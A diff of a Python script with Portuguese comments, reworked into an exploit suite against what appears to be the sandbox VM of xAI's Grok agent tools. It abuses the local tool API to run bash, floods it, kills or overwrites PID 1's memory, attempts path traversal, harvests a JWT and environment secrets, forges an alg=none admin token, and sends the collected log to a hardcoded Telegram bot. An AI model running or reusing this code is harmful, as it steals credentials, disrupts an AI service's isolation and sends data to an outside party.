@@ -2,10 +2,8 @@
 # -*- coding: utf-8 -*-
 
 """
-Sandbox Escape Test Suite - Versão Completa
-Executa testes de escape na VM Hades (xAI/Grok) e envia relatório para o Telegram.
-Autor: Wanderson (adaptado)
-Data: 2026-08-29
+Grok-Focused Sandbox Exploit Suite
+Explora especificamente serviços e binários da xAI/Grok na VM Hades.
 """
 
 import os
@@ -13,373 +11,433 @@ import sys
 import subprocess
 import time
 import json
-import hashlib
 import socket
-import base64
 import requests
+import base64
+import hashlib
 from datetime import datetime, timezone
-from pathlib import Path
 
-# =================== CONFIGURAÇÃO ===================
+# =================== CONFIG ===================
 BOT_TOKEN = "8870734086:AAF_9CQIn-xO-5dd-npb4k_wvYs-QShmxi4"
 CHAT_ID = "230885588"
-LOG_FILE = "/tmp/escape_test_full.log"
-TIMEOUT_CMD = 15          # timeout padrão para comandos shell
-TIMEOUT_NET = 5           # timeout para requisições de rede
-# ====================================================
+LOG_FILE = "/tmp/grok_exploit_log.txt"
+TIMEOUT_CMD = 15
+TIMEOUT_NET = 10
+# ===============================================
 
-# Lista global para acumular linhas do log
 log_lines = []
 
 def add_log(msg=""):
-    """Adiciona uma linha ao log e imprime no console."""
     log_lines.append(str(msg))
     print(msg)
 
 def sh(cmd, timeout=TIMEOUT_CMD):
-    """Executa um comando shell e retorna a saída (stdout+stderr)."""
     try:
-        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
-        return result.stdout + result.stderr
-    except subprocess.TimeoutExpired:
-        return f"(TIMEOUT após {timeout}s) comando: {cmd}"
-    except Exception as e:
-        return f"(ERRO ao executar: {e})"
+        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
+        return r.stdout + r.stderr
+    except:
+        return "(erro/timeout)"
 
 def file_read(path):
-    """Lê o conteúdo de um arquivo, se existir."""
     try:
         with open(path, 'r') as f:
             return f.read()
-    except Exception:
+    except:
         return None
 
-def file_exists(path):
+def exists(path):
     return os.path.exists(path)
 
-# ============================================================
-# SEÇÕES DE TESTE
-# ============================================================
-
-def section_header(title):
+def section(title):
     add_log("\n" + "="*72)
     add_log(title)
     add_log("="*72)
 
-# 1. IDENTIDADE
-def test_identity():
-    section_header("1. IDENTIDADE DO AMBIENTE")
-    add_log(f"hostname: {socket.gethostname()}")
-    add_log(f"uname: {sh('uname -a').strip()}")
-    add_log(f"kernel cmdline: {sh('cat /proc/cmdline').strip()[:500]}")
-    add_log("Tipo: VM Hades (xAI/Grok) sobre Cloud Hypervisor")
-    add_log("Init: catatonit → xai-hades-charon (init + serve-ch-vsock)")
-
-# 2. PRIVILÉGIOS
-def test_privileges():
-    section_header("2. PRIVILÉGIOS E CAPABILITIES")
-    add_log(sh("id").strip())
-    add_log("Capabilities (self):")
-    add_log(sh("grep Cap /proc/self/status").strip())
-    add_log("Capabilities (PID1):")
-    add_log(sh("grep Cap /proc/1/status").strip())
-    add_log("NoNewPrivs self: " + sh("grep NoNewPrivs /proc/self/status").strip())
-    add_log("NoNewPrivs PID1: " + sh("grep NoNewPrivs /proc/1/status").strip())
-    add_log("Seccomp: " + sh("grep -i seccomp /proc/self/status").strip())
-    add_log("✅ Executando como root" if os.geteuid() == 0 else "⚠️  Não é root")
-
-# 3. DISPOSITIVOS E FILESYSTEMS
-def test_devices():
-    section_header("3. DISPOSITIVOS E FILESYSTEMS")
-    add_log("lsblk:")
-    add_log(sh("lsblk").strip())
-    add_log("\nDispositivos especiais:")
-    add_log(sh("ls -la /dev/ | grep -E 'mem|kmem|port|kmsg|vsock|vda|vdb|vdc|vdd|vport'").strip())
-    add_log("\nMontagens:")
-    add_log(sh("cat /proc/mounts").strip())
-
-# 4. VSOCK
-def test_vsock():
-    section_header("4. TESTE VSOCK (COMUNICAÇÃO COM HOST)")
-    if not file_exists("/dev/vsock"):
-        add_log("/dev/vsock NÃO encontrado")
+# ===============================================
+# 1. GROK-COMPUTER-SERVER (API local 4242)
+# ===============================================
+def test_grok_computer_server():
+    section("1. EXPLORAÇÃO DO GROK-COMPUTER-SERVER (porta 4242)")
+    # Verificar se está rodando
+    pid = None
+    for line in sh("ps aux | grep 'grok-computer-server' | grep -v grep").splitlines():
+        parts = line.split()
+        if len(parts) > 1 and parts[1].isdigit():
+            pid = int(parts[1])
+            break
+    if pid:
+        add_log(f"grok-computer-server rodando com PID {pid}")
+    else:
+        add_log("grok-computer-server NÃO encontrado")
         return
-    add_log("/dev/vsock presente")
-    # Tenta conectar em várias combinações
-    for cid in [2, 3, 4]:
-        for port in [22, 4242, 4243, 8080, 443, 80]:
-            try:
-                s = socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM)
-                s.settimeout(2)
-                s.connect((cid, port))
-                add_log(f"✅ CONEXÃO BEM-SUCEDIDA para CID {cid} porta {port}")
-                s.close()
-            except Exception:
-                pass
-    # Fuzzing básico no serviço charon (porta 4242)
+
+    # Testar endpoints conhecidos
+    endpoints = ["/health", "/sessions", "/tools", "/tools/call", "/sessions/list"]
+    for ep in endpoints:
+        url = f"http://127.0.0.1:4242{ep}"
+        try:
+            r = requests.get(url, timeout=TIMEOUT_NET)
+            add_log(f"GET {ep} -> {r.status_code} - {r.text[:100]}")
+        except Exception as e:
+            add_log(f"GET {ep} falhou: {e}")
+
+    # Tentar criar uma sessão (se o endpoint permitir)
     try:
-        s = socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM)
-        s.settimeout(3)
-        s.connect((2, 4242))
-        s.send(b'{"method":"ping"}\n')
-        resp = s.recv(1024)
-        add_log(f"Resposta do vsock (CID2:4242): {resp[:200]}")
-        s.close()
+        payload = {"method": "sessions/create", "params": {"name": "exploit"}}
+        r = requests.post("http://127.0.0.1:4242/sessions", json=payload, timeout=TIMEOUT_NET)
+        add_log(f"Criação de sessão: {r.status_code} - {r.text[:100]}")
+        if r.status_code == 200:
+            # Tentar extrair token de sessão
+            try:
+                data = r.json()
+                session_id = data.get("id", data.get("session_id"))
+                add_log(f"Sessão criada: {session_id}")
+                # Tentar usar essa sessão para chamar tools
+                call_payload = {
+                    "method": "tools/call",
+                    "params": {
+                        "name": "bash",
+                        "arguments": {"command": "whoami"},
+                        "_meta": {"traceparent": "00-..."}
+                    }
+                }
+                call_url = f"http://127.0.0.1:4242/sessions/{session_id}/tools/call"
+                r2 = requests.post(call_url, json=call_payload, timeout=TIMEOUT_NET)
+                add_log(f"Chamada de tool via sessão: {r2.status_code} - {r2.text[:200]}")
+            except:
+                pass
     except Exception as e:
-        add_log(f"Falha ao comunicar com vsock: {e}")
+        add_log(f"Erro ao criar sessão: {e}")
 
-# 5. MONTAGEM DE DISPOSITIVOS ADICIONAIS
-def test_block_mount():
-    section_header("5. TESTE DE MONTAGEM DE DISPOSITIVOS ADICIONAIS")
-    for dev in ["/dev/vdc", "/dev/vdb", "/dev/vda"]:
-        if not file_exists(dev):
-            add_log(f"{dev} não existe")
-            continue
-        mnt = f"/tmp/mnt_{dev.replace('/','_')}"
-        os.makedirs(mnt, exist_ok=True)
-        out = sh(f"mount -t auto {dev} {mnt} 2>&1")
-        if "mount" in out and ("permission" not in out.lower() and "bad option" not in out.lower()):
-            add_log(f"✅ Montagem de {dev} bem-sucedida em {mnt}")
-            add_log(f"Conteúdo (primeiros 20 itens):")
-            add_log(sh(f"ls -la {mnt} | head -20").strip())
-            # Tenta remontar como RW
-            add_log(f"Tentando remontar {dev} como RW:")
-            add_log(sh(f"mount -o remount,rw {dev} 2>&1").strip())
-            sh(f"umount {mnt}")
-        else:
-            add_log(f"❌ Falha ao montar {dev}: {out[:200]}")
-
-# 6. /dev/mem e /dev/kmem
-def test_dev_mem():
-    section_header("6. TESTE DE ACESSO A /dev/mem E /dev/kmem")
-    for f in ["/dev/mem", "/dev/kmem"]:
-        if not file_exists(f):
-            add_log(f"{f} não existe")
-            continue
+    # Tentar sobrecarga de requisições concorrentes
+    add_log("Tentando flood de requisições para /health (possível DoS)")
+    for i in range(20):
         try:
-            with open(f, 'rb') as fd:
-                data = fd.read(1024)
-            add_log(f"✅ Leitura de {f} bem-sucedida (primeiros 1024 bytes)")
-            strings = data.decode('latin-1', errors='ignore').strip()
-            add_log(f"Strings encontradas: {strings[:200]}")
-        except Exception as e:
-            add_log(f"❌ Erro ao ler {f}: {e}")
-    # Leitura em offsets maiores
-    add_log("\nLeitura de /dev/mem em offsets maiores:")
-    for offset in [0x100000, 0x20000000, 0x40000000]:
-        cmd = f"dd if=/dev/mem bs=1M skip={offset//1048576} count=1 2>/dev/null | strings | head -5"
-        out = sh(cmd, timeout=10)
-        if out.strip():
-            add_log(f"Offset {hex(offset)}: {out[:200]}")
+            requests.get("http://127.0.0.1:4242/health", timeout=1)
+        except:
+            pass
+    add_log("Flood concluído")
 
-# 7. CARREGAMENTO DE MÓDULO
-def test_module_loading():
-    section_header("7. TESTE DE CARREGAMENTO DE MÓDULO KERNEL")
-    disabled = file_read("/proc/sys/kernel/modules_disabled")
-    if disabled and "0" in disabled:
-        add_log("✅ Módulos habilitados (modules_disabled=0)")
-        if sh("which gcc").strip():
-            add_log("gcc encontrado, compilando módulo dummy")
-            code = """
-#include <linux/module.h>
-#include <linux/kernel.h>
-static int __init init(void) { printk(KERN_INFO "ESCAPE_MODULE_LOADED\\n"); return 0; }
-static void __exit exit(void) { printk(KERN_INFO "ESCAPE_MODULE_UNLOADED\\n"); }
-module_init(init);
-module_exit(exit);
-MODULE_LICENSE("GPL");
-"""
-            with open("/tmp/dummy.c", "w") as f:
-                f.write(code)
-            sh("cd /tmp && gcc -c dummy.c -o dummy.o 2>&1")
-            if file_exists("/tmp/dummy.o"):
-                out = sh("insmod /tmp/dummy.o 2>&1")
-                if "Error" not in out:
-                    add_log("✅ Módulo carregado com sucesso!")
-                    add_log(sh("lsmod | grep dummy").strip())
-                    sh("rmmod dummy 2>&1")
-                else:
-                    add_log(f"❌ Falha ao carregar módulo: {out[:200]}")
-            else:
-                add_log("Falha na compilação do módulo")
-        else:
-            add_log("gcc não encontrado, impossível compilar")
-    else:
-        add_log("❌ Módulos desabilitados (modules_disabled != 0)")
+# ===============================================
+# 2. GROK-FILES (FUSE e API remota)
+# ===============================================
+def test_grok_files():
+    section("2. EXPLORAÇÃO DO GROK-FILES (FUSE e API)")
+    # Verificar se o fuse está montado
+    out = sh("mount | grep grok-files").strip()
+    add_log(f"Mount: {out}")
 
-# 8. PIVOT_ROOT E OVERLAY
-def test_pivot_root():
-    section_header("8. TESTE DE PIVOT_ROOT / ESCAPE DO OVERLAY")
-    os.makedirs("/tmp/newroot", exist_ok=True)
-    os.makedirs("/tmp/oldroot", exist_ok=True)
-    out = sh("pivot_root /tmp/newroot /tmp/oldroot 2>&1")
-    if "pivot_root" in out and "success" not in out:
-        add_log(f"pivot_root falhou: {out[:200]}")
-        add_log("Tentando mount --move / /tmp/newroot")
-        out2 = sh("mount --move / /tmp/newroot 2>&1")
-        add_log(out2[:200])
-    else:
-        add_log("✅ pivot_root parece ter funcionado (cuidado!)")
-        add_log("Listando /tmp/oldroot:")
-        add_log(sh("ls -la /tmp/oldroot | head -20").strip())
-
-    # Teste com unshare
-    add_log("\nTeste com unshare -m:")
-    out3 = sh("unshare -m bash -c 'mount --bind / /mnt && ls /mnt | head -5'")
-    add_log(out3[:300])
-
-# 9. FUSE GROK-FILES
-def test_grok_fuse():
-    section_header("9. TESTE DE FUSE GROK-FILES")
-    add_log("Mount grok-files: " + sh("mount | grep grok-files").strip())
-    if os.path.isdir("/home/workdir/artifacts"):
-        add_log("Tentando criar links simbólicos para escape")
+    # Tentar acessar arquivos fora do diretório via caminhos relativos
+    fuse_root = "/home/workdir/artifacts"
+    if exists(fuse_root):
+        add_log("Tentando listar /etc/passwd via symlink (já bloqueado, mas vamos tentar de novo)")
         try:
-            os.symlink("/etc/passwd", "/home/workdir/artifacts/passwd_link")
-            add_log("Link criado, tentando ler via FUSE:")
-            add_log(sh("cat /home/workdir/artifacts/passwd_link 2>&1").strip()[:200])
-            os.unlink("/home/workdir/artifacts/passwd_link")
+            os.symlink("/etc/passwd", f"{fuse_root}/passwd_link")
+            add_log("Link criado! Tentando ler...")
+            content = file_read(f"{fuse_root}/passwd_link")
+            add_log(f"Conteúdo: {content[:200]}")
+            os.unlink(f"{fuse_root}/passwd_link")
         except Exception as e:
-            add_log(f"Falha ao criar link: {e}")
+            add_log(f"Falha no symlink: {e}")
 
-# 10. PROCESSOS
-def test_processes():
-    section_header("10. PROCESSOS RELEVANTES")
-    add_log(sh("ps aux --sort=-%mem | head -25").strip())
+        # Tentar criar arquivo com nome malicioso (path traversal)
+        for name in ["../test", "../../test", "/tmp/test"]:
+            try:
+                with open(f"{fuse_root}/{name}", "w") as f:
+                    f.write("teste")
+                add_log(f"Arquivo criado: {name}")
+                # Verificar se o arquivo realmente foi criado fora
+                if exists(f"/tmp/{name.split('/')[-1]}"):
+                    add_log("POSSÍVEL PATH TRAVERSAL! Arquivo criado fora do FUSE.")
+            except Exception as e:
+                pass
 
-# 11. NAMESPACES
-def test_namespaces():
-    section_header("11. NAMESPACES")
-    add_log(sh("ls -la /proc/self/ns/").strip())
-    add_log("\nNamespaces do PID1:")
-    add_log(sh("readlink /proc/1/ns/* 2>/dev/null").strip())
+    # Interagir com a API de files.grok.com
+    jwt = file_read("/etc/secrets/terminal.jwt") or os.environ.get("TERMINAL_JWT_VAL")
+    if jwt:
+        add_log("JWT encontrado. Testando endpoints da API grok-files")
+        headers = {"Authorization": f"Bearer {jwt}"}
+        endpoints = [
+            "/api/v1/files",
+            "/api/v1/projects",
+            "/api/v1/list",
+            "/api/v1/me",
+            "/api/v1/upload",
+            "/api/v1/download",
+            "/api/v1/delete"
+        ]
+        for ep in endpoints:
+            url = f"https://files.grok.com{ep}"
+            try:
+                r = requests.get(url, headers=headers, timeout=TIMEOUT_NET)
+                add_log(f"{ep}: {r.status_code} - {r.text[:100]}")
+            except Exception as e:
+                add_log(f"{ep} falhou: {e}")
 
-# 12. JWT
-def test_jwt():
-    section_header("12. JWT E SECRETS")
+        # Tentar fazer upload de um arquivo com conteúdo suspeito
+        try:
+            files = {'file': ('exploit.sh', '#!/bin/bash\necho "exploit" > /tmp/hacked\n')}
+            r = requests.post("https://files.grok.com/api/v1/upload", headers=headers, files=files, timeout=TIMEOUT_NET)
+            add_log(f"Upload: {r.status_code} - {r.text[:100]}")
+        except Exception as e:
+            add_log(f"Upload falhou: {e}")
+
+        # Tentar listar todos os arquivos do projeto
+        try:
+            r = requests.get("https://files.grok.com/api/v1/list?recursive=true", headers=headers, timeout=TIMEOUT_NET)
+            add_log(f"Listagem recursiva: {r.status_code} - {r.text[:200]}")
+        except Exception as e:
+            add_log(f"Listagem recursiva falhou: {e}")
+
+# ===============================================
+# 3. GROK-KILLGUARD (seccomp + ptrace blockers)
+# ===============================================
+def test_grok_killguard():
+    section("3. TESTE DE BYPASS DO GROK-KILLGUARD")
+    # Verificar se o killguard está rodando
+    out = sh("ps aux | grep grok-killguard | grep -v grep").strip()
+    add_log(f"grok-killguard em execução: {out}")
+
+    # Tentar enviar sinais para processos protegidos
+    add_log("Tentando enviar SIGTERM para PID 1 (catatonit)")
+    out = sh("kill -TERM 1 2>&1")
+    add_log(out)
+
+    # Tentar enviar SIGCONT para um processo aleatório
+    add_log("Tentando SIGCONT para o processo grok-files")
+    pid_grok = None
+    for line in sh("ps aux | grep 'grok-files' | grep -v grep").splitlines():
+        parts = line.split()
+        if len(parts) > 1 and parts[1].isdigit():
+            pid_grok = int(parts[1])
+            break
+    if pid_grok:
+        out = sh(f"kill -CONT {pid_grok} 2>&1")
+        add_log(f"kill -CONT {pid_grok}: {out}")
+
+    # Tentar usar ptrace (mesmo com killguard, pode haver falhas)
+    add_log("Tentando ptrace via gdb (se instalado)")
+    if sh("which gdb").strip():
+        out = sh("gdb -p 1 --batch -ex 'info reg' 2>&1 | head -10")
+        add_log(out)
+    else:
+        add_log("gdb não instalado")
+
+    # Tentar usar /proc/pid/mem para escrever em memória de outro processo
+    add_log("Tentando escrever em /proc/1/mem (se permitido)")
+    if exists("/proc/1/mem"):
+        try:
+            with open("/proc/1/mem", "wb") as f:
+                f.write(b"\x00"*10)
+            add_log("Escrita em /proc/1/mem bem-sucedida!")
+        except Exception as e:
+            add_log(f"Erro ao escrever em /proc/1/mem: {e}")
+
+    # Verificar se o killguard impede kill de grupo de processos
+    add_log("Tentando matar grupo de processos do grok-files (via styx?)")
+    if exists("/.hades-container-tools/xai-hades-styx"):
+        out = sh("/.hades-container-tools/xai-hades-styx kill-process-group 2>&1")
+        add_log(out[:200])
+
+# ===============================================
+# 4. XAI-HADES-STYX (ferramenta interna poderosa)
+# ===============================================
+def test_styx():
+    section("4. EXPLORAÇÃO DO XAI-HADES-STYX")
+    styx_path = "/.hades-container-tools/xai-hades-styx"
+    if not exists(styx_path):
+        add_log("styx não encontrado")
+        return
+    add_log("styx encontrado. Testando comandos...")
+
+    # Listar opções
+    out = sh(f"{styx_path} --help 2>&1")
+    add_log(f"Help: {out[:200]}")
+
+    # Tentar executar comandos com styx
+    for cmd in ["id", "whoami", "cat /etc/passwd", "ls -la /"]:
+        out = sh(f"{styx_path} exec bash -c '{cmd}' 2>&1")
+        add_log(f"exec '{cmd}': {out[:200]}")
+
+    # Tentar usar a opção pentest (se existir)
+    out = sh(f"{styx_path} pentest 2>&1")
+    add_log(f"pentest: {out[:200]}")
+
+    # Tentar kill-all-but-init (cuidado)
+    out = sh(f"{styx_path} kill-all-but-init 2>&1")
+    add_log(f"kill-all-but-init: {out[:200]}")
+
+    # Tentar usar pty para obter shell interativo (pode permitir escape)
+    out = sh(f"{styx_path} pty bash 2>&1 | head -10")
+    add_log(f"pty: {out}")
+
+# ===============================================
+# 5. JWT E CREDENCIAIS
+# ===============================================
+def test_jwt_exploit():
+    section("5. EXPLORAÇÃO DE JWT E CREDENCIAIS")
     jwt_path = "/etc/secrets/terminal.jwt"
-    if not file_exists(jwt_path):
+    if not exists(jwt_path):
         add_log("JWT não encontrado")
         return
     jwt = file_read(jwt_path)
-    if not jwt:
-        add_log("JWT vazio")
-        return
-    add_log(f"JWT lido de {jwt_path} (tamanho {len(jwt)})")
+    add_log(f"JWT lido (tamanho {len(jwt)})")
     try:
         parts = jwt.split(".")
-        if len(parts) >= 2:
+        if len(parts) >= 3:
+            import base64
             header = json.loads(base64.urlsafe_b64decode(parts[0] + "=" * (-len(parts[0]) % 4)))
             payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=" * (-len(parts[1]) % 4)))
             add_log(f"Header: {header}")
-            add_log("Claims:")
-            for k, v in payload.items():
-                if k in ("exp", "iat"):
-                    add_log(f"  {k}: {v} ({datetime.fromtimestamp(v, tz=timezone.utc).isoformat()})")
-                else:
-                    add_log(f"  {k}: {v}")
+            add_log(f"Payload: {json.dumps(payload, indent=2)}")
+            # Verificar se o token está expirado
+            exp = payload.get("exp", 0)
+            if time.time() > exp:
+                add_log("⚠️ JWT EXPIRADO")
+            else:
+                add_log(f"JWT válido até {datetime.fromtimestamp(exp).isoformat()}")
+            # Tentar modificar o JWT (alg=none, etc.) - não será verificado pelo servidor
+            # Mas podemos tentar enviar o token modificado para a API
+            # Criar um token com alg=none (não funcionará, mas teste)
+            fake_payload = payload.copy()
+            fake_payload["uid"] = "admin"
+            fake_header = {"typ": "JWT", "alg": "none"}
+            # Codificar sem assinatura
+            h = base64.urlsafe_b64encode(json.dumps(fake_header).encode()).decode().rstrip("=")
+            p = base64.urlsafe_b64encode(json.dumps(fake_payload).encode()).decode().rstrip("=")
+            fake_jwt = f"{h}.{p}."
+            add_log(f"JWT falso criado (alg=none): {fake_jwt[:50]}...")
+            # Tentar usar esse token fake na API
+            headers = {"Authorization": f"Bearer {fake_jwt}"}
+            try:
+                r = requests.get("https://files.grok.com/api/v1/me", headers=headers, timeout=TIMEOUT_NET)
+                add_log(f"API com token fake: {r.status_code} - {r.text[:100]}")
+            except Exception as e:
+                add_log(f"Falha com token fake: {e}")
     except Exception as e:
         add_log(f"Erro ao decodificar JWT: {e}")
 
-# 13. API FILES.GROK.COM
-def test_files_api():
-    section_header("13. TESTE DE ACESSO À API FILES.GROK.COM")
-    jwt = os.environ.get("TERMINAL_JWT_VAL") or file_read("/etc/secrets/terminal.jwt")
-    if not jwt:
-        add_log("Sem JWT disponível")
+    # Procurar outras credenciais no ambiente
+    add_log("Buscando tokens em variáveis de ambiente...")
+    env = sh("env | grep -E 'TOKEN|KEY|SECRET|PASS|JWT' 2>/dev/null")
+    add_log(env[:500])
+    # Buscar em arquivos .env
+    for env_file in ["/home/workdir/artifacts/.env", "/app/.env", "/.env"]:
+        if exists(env_file):
+            content = file_read(env_file)
+            add_log(f"Conteúdo de {env_file}:")
+            add_log(content[:500])
+
+# ===============================================
+# 6. TESTE DE VSOCK FOCADO NO CHARON
+# ===============================================
+def test_vsock_charon():
+    section("6. COMUNICAÇÃO VSOCK COM CHARON (PROTOCOLO ESPECÍFICO)")
+    if not exists("/dev/vsock"):
+        add_log("/dev/vsock não existe")
         return
-    headers = {"Authorization": f"Bearer {jwt}"}
-    endpoints = ["/api/v1/files", "/api/v1/projects", "/api/v1/list", "/api/v1/me"]
-    for endpoint in endpoints:
-        url = f"https://files.grok.com{endpoint}"
+    # Tentar descobrir o protocolo do charon enviando comandos comuns
+    # Baseado em strings do binário (se disponível)
+    commands = ["init", "ping", "status", "exec", "read_file", "write_file", "mount", "umount", "ps", "kill"]
+    for cid in [2, 3]:
+        for port in [4242, 4243]:
+            for cmd in commands:
+                try:
+                    s = socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM)
+                    s.settimeout(2)
+                    s.connect((cid, port))
+                    # Tentar enviar JSON com método
+                    payload = json.dumps({"method": cmd, "params": {"arg": "test"}}).encode() + b"\n"
+                    s.send(payload)
+                    data = s.recv(4096)
+                    if data:
+                        add_log(f"Resposta de {cid}:{port} para '{cmd}': {data[:200]}")
+                    s.close()
+                except Exception as e:
+                    # Se houve erro, ignorar
+                    pass
+    # Tentar enviar dados binários que possam causar overflow
+    for size in [1024, 4096, 8192]:
         try:
-            r = requests.get(url, headers=headers, timeout=TIMEOUT_NET)
-            add_log(f"Endpoint {endpoint}: status {r.status_code} - {r.text[:100]}")
-        except Exception as e:
-            add_log(f"Endpoint {endpoint} falhou: {e}")
+            s = socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM)
+            s.settimeout(2)
+            s.connect((2, 4242))
+            s.send(b"\x00" * size)
+            data = s.recv(1024)
+            if data:
+                add_log(f"Resposta para payload de {size} bytes: {data[:100]}")
+            s.close()
+        except:
+            pass
 
-# 14. TESTE ADICIONAL: PTRACE
-def test_ptrace():
-    section_header("14. TESTE DE PTRACE")
-    # Tenta anexar a um processo qualquer (ex: PID 1)
-    out = sh("gdb -p 1 --batch -ex 'info reg' 2>&1")
-    if "ptrace" in out and "Operation not permitted" in out:
-        add_log("❌ ptrace bloqueado (grok-killguard ativo)")
-    else:
-        add_log("✅ ptrace possivelmente permitido (saída):")
-        add_log(out[:300])
+# ===============================================
+# 7. TESTE DE ABUSO DE MCP E TOOLS
+# ===============================================
+def test_mcp_tools():
+    section("7. ABUSO DO MCP E TOOLS DO GROK-COMPUTER")
+    # Tentar listar ferramentas disponíveis
+    try:
+        r = requests.get("http://127.0.0.1:4242/tools", timeout=TIMEOUT_NET)
+        add_log(f"Lista de ferramentas: {r.text[:300]}")
+        tools = r.json().get("tools", []) if r.status_code == 200 else []
+        for tool in tools:
+            name = tool.get("name")
+            add_log(f"Ferramenta: {name}")
+            # Tentar chamar cada ferramenta com parâmetros arbitrários
+            if name in ["bash", "python", "exec"]:
+                call_url = "http://127.0.0.1:4242/tools/call"
+                payload = {
+                    "method": "tools/call",
+                    "params": {
+                        "name": name,
+                        "arguments": {"command": "id > /tmp/mcp_exploit.txt"},
+                        "_meta": {"traceparent": "00-..."}
+                    }
+                }
+                r2 = requests.post(call_url, json=payload, timeout=TIMEOUT_NET)
+                add_log(f"Chamada da ferramenta {name}: {r2.status_code} - {r2.text[:200]}")
+                # Verificar se o arquivo foi criado
+                if exists("/tmp/mcp_exploit.txt"):
+                    add_log("ARQUIVO CRIADO! Comando executado com sucesso via MCP.")
+    except Exception as e:
+        add_log(f"Erro ao acessar MCP: {e}")
 
-# 15. TESTE DE ESCRITA EM /proc
-def test_proc_write():
-    section_header("15. TESTE DE ESCRITA EM /proc (sysctl)")
-    # Tenta modificar algo simples (ex: core_pattern)
-    out = sh("echo '|/tmp/exploit' > /proc/sys/kernel/core_pattern 2>&1")
-    if "Permission denied" in out or "Read-only" in out:
-        add_log("❌ Escrita em /proc bloqueada")
-    else:
-        add_log("✅ Escrita em /proc possivelmente permitida (cuidado!)")
-        add_log(out[:200])
-
-# ============================================================
-# FUNÇÃO PRINCIPAL
-# ============================================================
+# ===============================================
+# MAIN
+# ===============================================
 def main():
     add_log("="*72)
-    add_log("RELATÓRIO COMPLETO DE TESTES DE ESCAPE")
+    add_log("RELATÓRIO DE EXPLORAÇÃO FOCADO NO GROK")
     add_log(f"Gerado em: {datetime.now(timezone.utc).isoformat()}")
-    add_log("Escopo: VM Hades (xAI/Grok) - análise interna")
+    add_log("Alvos: grok-computer-server, grok-files, grok-killguard, styx, JWT")
     add_log("="*72)
 
-    # Executa todas as seções
-    test_identity()
-    test_privileges()
-    test_devices()
-    test_vsock()
-    test_block_mount()
-    test_dev_mem()
-    test_module_loading()
-    test_pivot_root()
-    test_grok_fuse()
-    test_processes()
-    test_namespaces()
-    test_jwt()
-    test_files_api()
-    test_ptrace()
-    test_proc_write()
+    test_grok_computer_server()
+    test_grok_files()
+    test_grok_killguard()
+    test_styx()
+    test_jwt_exploit()
+    test_vsock_charon()
+    test_mcp_tools()
 
-    # Rodapé
     add_log("\n" + "="*72)
     add_log("FIM DO RELATÓRIO")
     add_log("="*72)
 
-    # Escreve arquivo de log
     full_log = "\n".join(log_lines)
-    with open(LOG_FILE, "w", encoding="utf-8") as f:
+    with open(LOG_FILE, "w") as f:
         f.write(full_log)
 
-    print(f"\nLog salvo em {LOG_FILE} (tamanho: {len(full_log)} bytes)")
-
-    # Envia para o Telegram
+    # Enviar para Telegram
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
         with open(LOG_FILE, 'rb') as f:
             files = {'document': (os.path.basename(LOG_FILE), f, 'text/plain')}
-            data = {'chat_id': CHAT_ID, 'caption': f'Escape Test Report - {datetime.now().isoformat()}'}
-            response = requests.post(url, files=files, data=data, timeout=30)
-        if response.status_code == 200:
-            print("✅ Relatório enviado com sucesso para o Telegram!")
-        else:
-            print(f"❌ Falha ao enviar: {response.status_code} - {response.text}")
-            # Fallback: enviar como mensagem de texto
-            url_text = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-            payload = {'chat_id': CHAT_ID, 'text': full_log[:4000]}
-            resp = requests.post(url_text, json=payload, timeout=30)
-            if resp.status_code == 200:
-                print("✅ Log enviado como mensagem de texto (fallback)")
-            else:
-                print(f"❌ Fallback também falhou: {resp.text}")
+            data = {'chat_id': CHAT_ID, 'caption': f'Grok Exploit - {datetime.now().isoformat()}'}
+            requests.post(url, files=files, data=data, timeout=30)
+        print("✅ Enviado!")
     except Exception as e:
-        print(f"Erro no envio para Telegram: {e}")
+        print(f"Erro no envio: {e}")
 
 if __name__ == "__main__":
     main()
